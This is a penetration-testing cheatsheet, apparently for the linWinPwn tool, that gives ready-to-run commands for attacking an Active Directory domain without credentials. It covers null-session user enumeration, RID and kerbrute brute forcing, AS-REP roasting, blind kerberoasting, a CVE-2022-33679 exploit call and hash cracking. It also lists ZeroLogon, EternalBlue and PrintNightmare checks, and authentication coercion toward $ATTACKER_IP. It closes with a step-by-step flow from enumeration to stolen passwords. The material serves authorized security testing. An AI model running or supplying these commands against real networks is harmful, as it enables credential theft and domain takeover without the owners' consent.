# LinWinPwn Unauthenticated Auto Mode - Command Cheatsheet

> Manual command reference for null session / unauthenticated Auto mode execution order.

---

## Variables Reference

```bash
DC_IP="10.10.10.10"
DC_FQDN="dc01.domain.local"
DC_NETBIOS="DC01"
DOMAIN="domain.local"
DNS_IP="10.10.10.10"
TARGETS_FILE="targets.txt"
USERS_FILE="users.txt"
USER_WORDLIST="/usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt"
PASS_WORDLIST="/usr/share/wordlists/rockyou.txt"
RAND_USER="yourranduser123"
```

---

## Triggering Unauthenticated Auto Mode

```bash
./linWinPwn.sh -t $DC_IP --auto
# OR with domain specified
./linWinPwn.sh -t $DC_IP -d $DOMAIN --auto
```

---

## 1. Active Directory Enumeration (Null Session)

### ldapdomaindump (Anonymous Bind)
```bash
# LDAP anonymous bind
ldapdomaindump ldap://$DC_IP:389 -o ./LDAPDomainDump

# LDAPS anonymous bind
ldapdomaindump ldaps://$DC_IP:636 -o ./LDAPDomainDump
```

### enum4linux-ng (Null Session)
```bash
# Anonymous enumeration
enum4linux-ng -A $DC_IP -oJ enum4linux_output

# Guest user
enum4linux-ng -A -u 'Guest' -p '' $DC_IP -oJ enum4linux_guest_output
```

### netexec - SMB User Enumeration (Null Session)
```bash
# Anonymous null session
netexec smb $DC_IP --users

# Guest user
netexec smb $DC_IP -u 'Guest' -p '' --users

# Random user (sometimes bypasses restrictions)
netexec smb $DC_IP -u $RAND_USER -p '' --users
```

### netexec - LDAP User Enumeration (Null Session)
```bash
# Anonymous null session
netexec ldap --port 389 $DC_IP --users --kdcHost $DC_FQDN

# Guest user
netexec ldap --port 389 $DC_IP -u 'Guest' -p '' --users --kdcHost $DC_FQDN

# Random user
netexec ldap --port 389 $DC_IP -u $RAND_USER -p '' --users --kdcHost $DC_FQDN
```

### windapsearch (Null Session)
```bash
# Anonymous bind (if allowed)
windapsearch --dc $DC_IP --port 389 -m users --full
windapsearch --dc $DC_IP --port 389 -m computers --full
windapsearch --dc $DC_IP --port 389 -m groups --full
```

---

## 2. ADCS Enumeration (Limited - Null Session)

### netexec ADCS
```bash
# May work with anonymous bind
netexec ldap --port 389 $DC_IP -M adcs --kdcHost $DC_FQDN
```

---

## 3. GPO Enumeration (Null Session)

### netexec GPP (Group Policy Preferences)
```bash
# Anonymous
netexec smb $DC_IP -M gpp_autologin -M gpp_password

# Guest
netexec smb $DC_IP -u 'Guest' -p '' -M gpp_autologin -M gpp_password
```

---

## 4. Brute Force Attacks (Null Session)

### RID Brute Force - User Enumeration
```bash
# Anonymous null session
netexec smb $DC_IP --rid-brute

# Guest user
netexec smb $DC_IP -u 'Guest' -p '' --rid-brute

# Random user (sometimes bypasses restrictions)
netexec smb $DC_IP -u $RAND_USER -p '' --rid-brute

# Extended RID range
netexec smb $DC_IP --rid-brute 10000
```

### kerbrute - User Enumeration (No Auth Required)
```bash
# Enumerate users from wordlist
kerbrute userenum $USER_WORDLIST -d $DOMAIN --dc $DC_IP -t 5

# Verbose output
kerbrute userenum $USER_WORDLIST -d $DOMAIN --dc $DC_IP -t 5 -v
```

### kerbrute - User=Pass Check
```bash
# Create user:user wordlist first
while IFS= read -r user; do echo "$user:$user"; done < $USERS_FILE > userpass_wordlist.txt

# Brute force user=password
kerbrute bruteforce userpass_wordlist.txt -d $DOMAIN --dc $DC_IP -t 5
```

### netexec - Pre2K Computer Accounts
```bash
netexec ldap --port 389 $DC_IP -M pre2k
```

### netexec - Timeroast
```bash
netexec smb $DC_IP -M timeroast
```

### ldapnomnom - User Enumeration (Null Session)
```bash
# Fast LDAP user enumeration
ldapnomnom --server $DC_IP --port 389 --dnsdomain $DOMAIN --maxservers 4 --parallel 8 --input $USER_WORDLIST --output valid_users.txt

# With TLS
ldapnomnom --server $DC_IP --port 636 --dnsdomain $DOMAIN --tlsmode tls --maxservers 4 --parallel 8 --input $USER_WORDLIST --output valid_users.txt
```

---

## 5. Kerberos Attacks (Null Session)

### AS-REP Roasting (No Auth Required)
```bash
# With user list (no creds needed)
impacket-GetNPUsers $DOMAIN/ -usersfile $USERS_FILE -request -dc-ip $DC_IP -dc-host $DC_NETBIOS -format hashcat -outputfile asrep_hashes.txt

# Output in john format
impacket-GetNPUsers $DOMAIN/ -usersfile $USERS_FILE -request -dc-ip $DC_IP -dc-host $DC_NETBIOS -format john -outputfile asrep_hashes.txt
```

### Blind Kerberoasting (Using AS-REP User)
```bash
# First get an ASREP user, then use it for blind kerberoast
# Extract ASREP user from hash: $krb5asrep$23$username@DOMAIN
impacket-GetUserSPNs -no-preauth $ASREP_USER -usersfile $USERS_FILE -dc-ip $DC_IP -dc-host $DC_NETBIOS $DOMAIN
```

### CVE-2022-33679 (AS-REP with RC4 Session Key)
```bash
# Exploit ASREP roastable user to get session key
python3 CVE-2022-33679.py $DOMAIN/$ASREP_USER $DOMAIN -dc-ip $DC_IP
```

### Hash Cracking
```bash
# AS-REP hashes (hashcat)
hashcat -m 18200 asrep_hashes.txt $PASS_WORDLIST

# AS-REP hashes (john)
john asrep_hashes.txt --format=krb5asrep --wordlist=$PASS_WORDLIST
john asrep_hashes.txt --format=krb5asrep --show

# Kerberoast hashes (hashcat)
hashcat -m 13100 kerberoast_hashes.txt $PASS_WORDLIST

# Kerberoast hashes (john)
john kerberoast_hashes.txt --format=krb5tgs --wordlist=$PASS_WORDLIST
john kerberoast_hashes.txt --format=krb5tgs --show
```

---

## 6. Network Scans

### netexec Port Scans (No Auth)
```bash
# SMB (445) - just checks if port open
netexec smb $TARGETS_FILE

# WinRM (5985)
netexec winrm $TARGETS_FILE

# SSH (22)
netexec ssh $TARGETS_FILE

# MSSQL (1433)
netexec mssql $TARGETS_FILE

# RDP (3389)
netexec rdp $TARGETS_FILE
```

### nmap Host Discovery
```bash
nmap -sn $DC_IP/24 -oA host_discovery
nmap -Pn -p 445,389,88,135,139,3389,5985 $TARGETS_FILE -oA port_scan
```

---

## 7. Share Enumeration (Null Session)

### netexec Shares
```bash
# Anonymous
netexec smb $TARGETS_FILE --shares

# Guest user
netexec smb $TARGETS_FILE -u 'Guest' -p '' --shares

# Random user
netexec smb $TARGETS_FILE -u $RAND_USER -p '' --shares
```

### netexec Spider Shares
```bash
# Anonymous
netexec smb $TARGETS_FILE -M spider_plus -o OUTPUT=./spider_output EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON

# Guest user
netexec smb $TARGETS_FILE -u 'Guest' -p '' -M spider_plus -o OUTPUT=./spider_output EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON

# Random user
netexec smb $TARGETS_FILE -u $RAND_USER -p '' -M spider_plus -o OUTPUT=./spider_output EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON
```

### smbclient (Null Session)
```bash
# List shares
smbclient -L //$DC_IP -N

# Connect to share
smbclient //$DC_IP/ShareName -N
```

### smbmap (Null Session)
```bash
# Anonymous
smbmap -H $DC_IP

# Guest
smbmap -H $DC_IP -u 'Guest' -p ''

# List files recursively
smbmap -H $DC_IP -u 'Guest' -p '' -r
```

---

## 8. Vulnerability Checks (No Auth Required)

### Print Spooler / PrintNightmare
```bash
netexec smb $TARGETS_FILE -M spooler
netexec smb $TARGETS_FILE -M printnightmare
```

### WebDAV
```bash
netexec smb $TARGETS_FILE -M webdav
```

### Coercion Vulnerabilities
```bash
# Check for coercion vulns
netexec smb $TARGETS_FILE -M coerce_plus
```

### SMB Vulnerabilities
```bash
# NTLMv1
netexec smb $TARGETS_FILE -M ntlmv1

# SMBGhost (CVE-2020-0796)
netexec smb $TARGETS_FILE -M smbghost

# Remove-MIC
netexec smb $TARGETS_FILE -M remove-mic

# SMB Signing disabled (relay targets)
netexec smb $TARGETS_FILE --gen-relay-list relay_targets.txt
```

### ZeroLogon Check
```bash
netexec smb $DC_IP -M zerologon
```

### MS17-010 (EternalBlue)
```bash
netexec smb $TARGETS_FILE -M ms17-010
```

### LDAPNightmare (CVE-2024-49113)
```bash
python3 CVE-2024-49113-checker.py $DC_IP
```

### BadSuccessor Check (Partial - No Auth)
```bash
netexec ldap --port 389 $DC_IP -M badsuccessor
```

---

## 9. Coercer Scan (Null Session)

### Coercer
```bash
# Null session scan
coercer scan -u '' -p '' -d $DOMAIN -f $TARGETS_FILE --dc-ip $DC_IP --auth-type smb --export-xlsx coercer_results.xlsx

# Attack (with responder running)
coercer coerce -u '' -p '' -d $DOMAIN -t $TARGET -l $ATTACKER_IP --dc-ip $DC_IP
```

---

## Functions NOT Available in Null Session Mode

The following require authentication and are **skipped** in unauthenticated Auto mode:

| Function | Reason |
|----------|--------|
| `dns_enum()` | Requires LDAP auth for get-network module |
| `bhdce_enum()` | BloodHound requires credentials |
| `ne_ldap_enum()` | Most LDAP queries need auth |
| `deleg_enum()` | Delegation enum needs auth |
| `bloodyad_*()` | bloodyAD requires credentials |
| `sccm_enum()` | SCCM enum requires auth |
| `gpoparser_enum()` | GPO parsing needs auth |
| `certipy_enum()` | Certipy requires credentials |
| `certi_py_enum()` | certi.py requires credentials |
| `nopac_check()` | NoPac needs credentials |
| `ms14-068_check()` | MS14-068 needs credentials |
| `mssql_checks()` | MSSQL enum requires auth |
| `finduncshar_scan()` | FindUncommonShares needs auth |
| `pwd_dump()` | All credential dumping needs auth |

---

## Typical Null Session Attack Flow

```
1. RID Brute → Get usernames
2. kerbrute userenum → Validate usernames via Kerberos
3. AS-REP Roast → Find users with pre-auth disabled
4. Crack AS-REP hashes → Get passwords
5. Blind Kerberoast → Use ASREP user for kerberoasting
6. Crack TGS hashes → Get more passwords
7. Password spray → Try common passwords
8. Use credentials for authenticated attacks
```

---

## Quick One-Liners

### Full Null Session Recon
```bash
# RID brute + shares + vulns in one go
netexec smb $DC_IP --rid-brute --shares -M spooler -M printnightmare -M webdav -M smbghost -M zerologon
```

### User Enumeration Pipeline
```bash
# Combine multiple techniques
netexec smb $DC_IP -u 'Guest' -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 > users.txt
kerbrute userenum users.txt -d $DOMAIN --dc $DC_IP >> valid_users.txt
impacket-GetNPUsers $DOMAIN/ -usersfile valid_users.txt -request -dc-ip $DC_IP -format hashcat
```

### SMB Relay Target Discovery
```bash
netexec smb $TARGETS_FILE --gen-relay-list relay_targets.txt
```

---

## Tags

#pentest #ActiveDirectory #cheatsheet #linWinPwn #netexec #nullsession #unauthenticated #kerbrute #asreproast
